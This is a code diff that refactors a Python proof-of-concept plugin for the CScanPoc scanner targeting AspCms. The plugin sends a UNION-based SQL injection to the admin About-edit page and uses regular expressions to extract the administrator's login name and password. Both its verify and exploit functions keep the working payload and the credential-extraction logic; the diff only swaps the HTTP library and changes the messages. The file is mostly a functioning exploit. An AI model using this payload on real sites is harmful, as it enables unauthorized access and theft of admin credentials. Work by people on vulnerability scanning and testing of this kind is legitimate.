@@ -2,12 +2,6 @@
 
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
-import urllib.request
-import urllib.parse
-import urllib.error
-import urllib.request
-import urllib.error
-import urllib.parse
 import re
 
 
@@ -54,20 +48,17 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            exp = ("/admin/_content/_About/AspCms_AboutEdit.asp?id=1%20and%201=2%20union%20select"
+            payload_exp = ("/admin/_content/_About/AspCms_AboutEdit.asp?id=1%20and%201=2%20union%20select"
                    "%201,2,3,4,5,loginname,7,8,9,password,11,12,13,14,15,16,17,18,19,20,21,22,23,"
                    "24,25,26,27,28,29,30,31,32,33,34,35%20from%20aspcms_user%20where%20userid=1")
-
-            verify_url = '{target}'.format(target=self.target)+exp
-            content = urllib.request.urlopen(
-                urllib.request.Request(verify_url)).read()
-            pattern = re.compile(r'.*?name=[\'"]?SortName[\'"]?.*?value=[\'"]?(?P<username>\w+)[\'"]?'  # 匹配用户名
-                                 # 匹配密码
-                                 r'.*?name=[\'"]?PageTitle[\'"]?.*?value=[\'"]?(?P<password>\w+)[\'"]?',
+            verify_url = self.target + payload_exp
+            content = requests.get(verify_url).text
+            pattern = re.compile(r'.*?name=[\'"]?SortName[\'"]?.*?value=[\'"]?(?P<username>\w+)[\'"]?'   # 匹配用户名
+                                 r'.*?name=[\'"]?PageTitle[\'"]?.*?value=[\'"]?(?P<password>\w+)[\'"]?', # 匹配密码
                                  re.I | re.S)
             match = pattern.match(content)
             if match:
-                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞;\n具体请查看漏洞详情'.format(
                     target=self.target, name=self.vuln.name))
 
         except Exception as e:
@@ -80,22 +71,20 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                 target=self.target, vuln=self.vuln))
 
-            exp = ("/admin/_content/_About/AspCms_AboutEdit.asp?id=1%20and%201=2%20union%20select"
+            payload_exp = ("/admin/_content/_About/AspCms_AboutEdit.asp?id=1%20and%201=2%20union%20select"
                    "%201,2,3,4,5,loginname,7,8,9,password,11,12,13,14,15,16,17,18,19,20,21,22,23,"
                    "24,25,26,27,28,29,30,31,32,33,34,35%20from%20aspcms_user%20where%20userid=1")
 
-            verify_url = '{target}'.format(target=self.target)+exp
-            content = urllib.request.urlopen(
-                urllib.request.Request(verify_url)).read()
-            pattern = re.compile(r'.*?name=[\'"]?SortName[\'"]?.*?value=[\'"]?(?P<username>\w+)[\'"]?'  # 匹配用户名
-                                 # 匹配密码
-                                 r'.*?name=[\'"]?PageTitle[\'"]?.*?value=[\'"]?(?P<password>\w+)[\'"]?',
+            verify_url = self.target + payload_exp
+            content = requests.get(verify_url).text
+            pattern = re.compile(r'.*?name=[\'"]?SortName[\'"]?.*?value=[\'"]?(?P<username>\w+)[\'"]?'   # 匹配用户名
+                                 r'.*?name=[\'"]?PageTitle[\'"]?.*?value=[\'"]?(?P<password>\w+)[\'"]?', # 匹配密码
                                  re.I | re.S)
             match = pattern.match(content)
             if match:
                 username = match.group("username")
                 password = match.group("password")
-                self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的用户名为{username} 用户密码为{password}'.format(
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的用户名为{username} 用户密码为{password};\n具体请查看漏洞详情'.format(
                     target=self.target, name=self.vuln.name, username=username, password=password))
 
         except Exception as e:
